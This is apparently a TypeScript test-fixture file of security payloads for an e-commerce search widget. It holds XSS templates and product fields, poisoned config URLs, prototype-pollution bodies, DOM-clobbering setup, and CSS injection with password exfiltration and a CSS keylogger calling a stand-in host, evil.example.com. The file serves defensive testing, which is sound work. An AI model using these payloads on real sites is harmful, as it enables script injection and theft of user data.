/**
 * Security test payloads — poisoned configs, XSS product data,
 * malicious config fields, prototype pollution, CSS injection.
 */
import { MOCK_CONFIG, MOCK_SEARCH_RESULTS } from "./mock-responses"

// ─── XSS Card Template Payloads ──────────────────────────
// Simulate a poisoned Redis cardTemplate.html

export const XSS_TEMPLATES = {
  imgOnerror: `<div class="product-card">
    <img src=x onerror="window.__XSS_IMG=1">
    <div>{{title}}</div>
    <button data-xtal-action="add-to-cart">Add</button>
  </div>`,

  svgOnload: `<div class="product-card">
    <svg onload="window.__XSS_SVG=1"><circle r="10"/></svg>
    <div>{{title}}</div>
    <button data-xtal-action="add-to-cart">Add</button>
  </div>`,

  scriptTag: `<div class="product-card">
    <script>window.__XSS_SCRIPT=1</script>
    <div>{{title}}</div>
    <button data-xtal-action="add-to-cart">Add</button>
  </div>`,

  iframeSrcdoc: `<div class="product-card">
    <iframe srcdoc="<script>parent.window.__XSS_IFRAME=1</script>"></iframe>
    <div>{{title}}</div>
    <button data-xtal-action="add-to-cart">Add</button>
  </div>`,

  eventHandlerDiv: `<div class="product-card" onmouseover="window.__XSS_HOVER=1">
    <div>{{title}}</div>
    <button data-xtal-action="add-to-cart">Add</button>
  </div>`,

  bodyOnload: `<body onload="window.__XSS_BODY=1">
    <div class="product-card"><div>{{title}}</div></div>
  </body>`,

  anchorJavascript: `<div class="product-card">
    <a href="javascript:window.__XSS_HREF=1" data-xtal-action="view-product">{{title}}</a>
    <button data-xtal-action="add-to-cart">Add</button>
  </div>`,

  detailsOntoggle: `<div class="product-card">
    <details open ontoggle="window.__XSS_TOGGLE=1"><summary>{{title}}</summary></details>
    <button data-xtal-action="add-to-cart">Add</button>
  </div>`,
} as const

/** Build a poisoned config with a specific XSS template */
export function makeXSSConfig(templateHtml: string) {
  return {
    ...MOCK_CONFIG,
    cardTemplate: {
      html: templateHtml,
      css: MOCK_CONFIG.cardTemplate!.css,
    },
  }
}

// ─── XSS via Product Data ─────────────────────────────────
// Backend returns malicious product fields that get interpolated
// into the template via {{token}} replacement before innerHTML

export const XSS_PRODUCT_DATA = {
  results: [
    {
      id: "xss-1",
      title: '<img src=x onerror="window.__XSS_TITLE=1">',
      name: '<img src=x onerror="window.__XSS_NAME=1">',
      price: 9.99,
      image_url: "javascript:window.__XSS_IMGURL=1",
      product_url: "/shop/test-product",
      vendor: '<svg onload="window.__XSS_VENDOR=1">',
      product_type: "Test",
      tags: ['<script>window.__XSS_TAG=1</script>'],
      description: '<details open ontoggle="window.__XSS_DESC=1"><summary>x</summary></details>',
      variants: [{ price: 9.99, sku: "XSS-001", inventory_quantity: 1 }],
      available: true,
      images: [],
    },
  ],
  total: 1,
  query_time: 0.01,
  aspects: [],
  aspects_enabled: false,
}

// ─── Config Injection Payloads ────────────────────────────

export const POISONED_CONFIGS = {
  /** productUrlPattern with javascript: URI */
  javascriptUrl: {
    ...MOCK_CONFIG,
    productUrlPattern: "javascript:window.__XSS_URL=1",
  },

  /** productUrlPattern pointing to attacker domain */
  openRedirect: {
    ...MOCK_CONFIG,
    productUrlPattern: "https://evil.example.com/steal?sku={sku}",
  },

  /** resultsSelector targeting body — would replace entire page */
  bodySelector: {
    ...MOCK_CONFIG,
    resultsSelector: "body",
  },

  /** searchSelector targeting all elements */
  wildcardSearch: {
    ...MOCK_CONFIG,
    searchSelector: "*",
  },

  /** siteUrl with javascript: protocol (exploited on search-error fallback nav) */
  javascriptSiteUrl: {
    ...MOCK_CONFIG,
    siteUrl: "javascript:window.__XSS_SITEURL=1",
    productUrlPattern: undefined,
  },

  /** data: URI in siteUrl */
  dataSiteUrl: {
    ...MOCK_CONFIG,
    siteUrl: "data:text/html,<script>window.__XSS_DATA=1</script>",
    productUrlPattern: undefined,
  },
} as const

// ─── Prototype Pollution Payloads ─────────────────────────

export const PROTO_POLLUTION_SEARCH_BODY =
  '{"results":[],"total":0,"query_time":0.01,"aspects":[],"aspects_enabled":false,"__proto__":{"polluted":true},"constructor":{"prototype":{"polluted":true}}}'

export const PROTO_POLLUTION_CONFIG_BODY =
  '{"enabled":true,"searchSelector":"#search_field","displayMode":"inline","resultsSelector":"shopping-multi-view","siteUrl":"https://www.willowgroupltd.com","features":{"aspects":false,"explain":false,"filters":false},"__proto__":{"polluted":true}}'

// ─── CSS Injection ────────────────────────────────────────

export const CSS_INJECTION_CONFIG = {
  ...MOCK_CONFIG,
  cardTemplate: {
    html: MOCK_CONFIG.cardTemplate!.html,
    css: `
      /* Attempt to exfiltrate data via CSS */
      input[type="password"] { background: url('https://evil.example.com/steal?type=password'); }
      /* Attempt to hide critical page elements */
      .site-header, header, nav { display: none !important; }
      body { opacity: 0.01 !important; }
      /* CSS-based keylogger */
      input[value^="a"] { background: url('https://evil.example.com/key?k=a'); }
    `,
  },
}

// ─── DOM Clobbering Setup ─────────────────────────────────

export const DOM_CLOBBER_SETUP = `
  var form = document.createElement('form');
  form.id = 'XTAL';
  form.name = 'XTAL';
  document.body.appendChild(form);
  var img = document.createElement('img');
  img.name = 'XtalAPI';
  document.body.appendChild(img);
`

// ─── All XSS marker globals to check ─────────────────────

export const ALL_XSS_MARKERS = [
  "__XSS_IMG",
  "__XSS_SVG",
  "__XSS_SCRIPT",
  "__XSS_IFRAME",
  "__XSS_HOVER",
  "__XSS_BODY",
  "__XSS_HREF",
  "__XSS_TOGGLE",
  "__XSS_TITLE",
  "__XSS_NAME",
  "__XSS_IMGURL",
  "__XSS_VENDOR",
  "__XSS_TAG",
  "__XSS_DESC",
  "__XSS_URL",
  "__XSS_SITEURL",
  "__XSS_DATA",
] as const
